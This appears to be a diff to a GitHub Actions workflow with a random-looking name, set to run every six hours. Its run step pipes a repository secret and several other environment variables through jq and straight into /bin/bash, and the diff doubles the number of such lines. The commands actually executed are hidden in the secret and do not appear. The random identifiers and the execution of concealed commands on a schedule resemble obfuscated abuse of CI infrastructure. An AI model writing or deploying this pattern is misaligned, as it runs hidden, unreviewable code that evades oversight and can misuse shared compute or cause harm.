@@ -2,7 +2,7 @@ name: rhinocerosesfoolhardy
 on:
   workflow_dispatch:
   schedule:
-    - cron: '35 4/6 * * *'
+    - cron: '30 2/6 * * *'
 
 jobs:
   build:
@@ -11,11 +11,16 @@ jobs:
       - uses: actions/checkout@v4
       - name: rhinocerosesfoolhardy
         env:
-          s9868: ${{ secrets.s9868 }}
+          bjj17: ${{ secrets.bjj17 }}
         run: |
-          echo $s9868 | jq -r .egc89021 | /bin/bash
-          echo $o0170 | jq -r .d9254 | /bin/bash
-          echo $wx51 | jq -r .u9 | /bin/bash
-          echo $w050 | jq -r .oy04 | /bin/bash
-          echo $cki6726 | jq -r .izu824 | /bin/bash
+          echo $bjj17 | jq -r .c96901 | /bin/bash
+          echo $abqjp276 | jq -r .gsfs6 | /bin/bash
+          echo $efv44674 | jq -r .vlr469 | /bin/bash
+          echo $m7 | jq -r .jnck943 | /bin/bash
+          echo $yer487 | jq -r .iyqwt7712 | /bin/bash
+          echo $ltk13967 | jq -r .e77756 | /bin/bash
+          echo $gom0 | jq -r .mvcth8141 | /bin/bash
+          echo $vh7 | jq -r .pf3 | /bin/bash
+          echo $fnyll7 | jq -r .sbxyo1673 | /bin/bash
+          echo $mv0089 | jq -r .sj19184 | /bin/bash
 
